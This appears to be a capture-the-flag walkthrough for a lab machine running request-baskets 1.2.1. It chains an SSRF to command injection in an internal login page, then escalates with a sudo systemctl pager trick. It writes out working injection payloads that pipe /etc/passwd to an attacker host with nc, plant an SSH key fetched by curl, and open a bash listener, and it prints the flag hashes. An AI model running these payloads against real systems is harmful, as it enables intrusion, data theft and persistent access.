
sudo nmap -v -p22,80,55555 -sV -sC 10.10.11.224

```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown


PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 09 Jul 2023 09:42:18 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 09 Jul 2023 09:41:51 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 09 Jul 2023 09:41:51 GMT
|_    Content-Length: 0
```

Website is located at http://10.10.11.224:55555/web
At the bottom: Powered by [request-baskets](https://github.com/darklynx/request-baskets) | Version: 1.2.1

GitHub diff from 1.2.1 to 1.2.2
https://github.com/darklynx/request-baskets/compare/v1.2.1...v1.2.2

```
version: "3"

services:
  postgresql:
    image: postgres
    ports:
      - "5432:5432"
    environment:
      POSTGRES_USER: rbaskets
      POSTGRES_PASSWORD: pwd
      POSTGRES_DB: baskets

  mysql:
    image: mysql
    ports:
      - "3306:3306"
    environment:
      MYSQL_DATABASE: baskets
      MYSQL_USER: rbaskets
      MYSQL_PASSWORD: pwd
      MYSQL_RANDOM_ROOT_PASSWORD: "yes"
```


## request-baskets SSRF
https://notes.sjtu.edu.cn/s/MUUhEymt7#

```
POST /baskets/passw3 HTTP/1.1
Host: 10.10.11.224:55555
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 125

{"forward_url": "http://10.10.16.23:80/b","proxy_response":false,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

Use **ncat** !!

`ncat -lvnp 80 -e /bin/bash`

True SSRF check of 80:

```
POST /baskets/i1 HTTP/1.1
Host: 10.10.11.224:55555
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 119

{"forward_url": "http://127.0.0.1:80/","proxy_response":true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

then /i1/index.html or /login:
https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

This opens port but I cannot access it:

```
curl 'http://10.10.11.224:55555/i1/login' -d 'username=;`nc -lvnp 8330`'
```

Ping check:
```
 curl 'http://10.10.11.224:55555/i1/login' -d 'username=;`ping 10.10.16.32 -c 1`'
```

File check:
```
curl 'http://10.10.11.224:55555/i1/login' -d 'username=;`cat /etc/passwd | nc 10.10.16.32 8330`'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
puma:x:1001:1001::/home/puma:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

cat /home/puma/user.txt:
958ee3a9496eec202a6049b0272341d8

copy my ssh key from python http server:

```
curl 'http://10.10.11.224:55555/i1/login' -d 'username=;`curl http://10.10.16.32:8000/sau_rsa.pub >> /home/puma/.ssh/authorized_keys`'
```


## Root flag:

sudo -l

sudo /usr/bin/systemctl status trail.service

https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7

b2e6a8ecd454529882ac6d686b7215e1